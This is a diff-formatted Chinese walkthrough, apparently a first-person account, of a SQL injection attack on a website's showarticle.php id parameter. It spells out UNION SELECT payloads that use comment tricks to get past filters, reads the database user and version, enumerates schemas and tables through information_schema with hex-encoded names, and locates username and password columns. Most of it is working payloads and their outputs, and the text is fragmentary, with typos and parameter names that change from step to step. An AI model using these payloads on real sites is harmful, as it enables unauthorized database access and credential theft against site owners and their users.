@@ -1,0 +1,49 @@
+
+showarticle.php?id=**/**/and/**/1=2/**/union/**/select/**/1,2,3,4,5,6,7,8/*   
+
+出现了2，4，5，6，7，8几个数字！ 这时候我们可以替换来
+
+查看信息！
+我分别替换上     user()      database()   version()    system_user() ， 
+这几个代表着：“用户名”   “数据库名” “数据库版本” “统用户名” 
+
+个不是root权限，所以我们老老实实的猜解
+
+猜解开始，我们来判断表名，我首先提交了
+
+showarticle.php?id=**/**/and/**/1=2/**/union/**/select/**/1,2,3,4,5,6,7,8/**/from/**/admin/*      结果返回不正常，
+
+administratosr system_user   manager  boss等，最后判断出来是user
+
+有后台，现在只要字段出来，我们就完工了！
+  
+看源代码，猜测得出字段为username   pwd  我回到前面继续，分别在2和7的位置替换上这两个！，返回不正常，也就说我猜测错误！
+
+第二天，
+
+可以通过不断递增limit的第一个参数查询到所有的数据库名，语句为
+
+showarticle.php?d=**/**/and/**/1=2/**/union/**/select/**/1,SCHEMA_NAME,3,4,5,6,7,8/**/from/**/
+information_schema.SCHEMATA/**/limit/**/1,2/*  
+
+看到我们想看到的信息！找到敏感的数据名，我们把它转换为十六进制编码的，secure转换为16进制为0x 736563757265！
+
+接着第一步，我们把所有的表都列出来
+
+showarticle.php?d=**/**/and/**/1=2/**/union/**/select/**/1,TABLE_NAME,3,4,5,6,7,8/**/from/**/
+information_schema.TABLES/**/where/**/TABLE_SCHEMA=0x736563757265/**/limit/**/1,1
+
+最后我发现43个表，我列出来了28个，
+counter
+user
+users
+我们先试试user，先把它转换为十六位进制的为0x75736572，依次查找该表里面的字段名 ，然后第三步我们提交
+
+showarticle.php?id=**/**/and/**/1=2/**/union/**/select/**/1,COLUMN_NAME,3,4,5,6,7,8/**/from/**/
+information_schema.COLUMNS/**/where/**/TABLE_NAME=0x75736572/**/limit/**/1,1
+
+name，
+
+第四步，我们替换一下limit/**/1,1为limit/**/2,1，
+
+出来了是pass
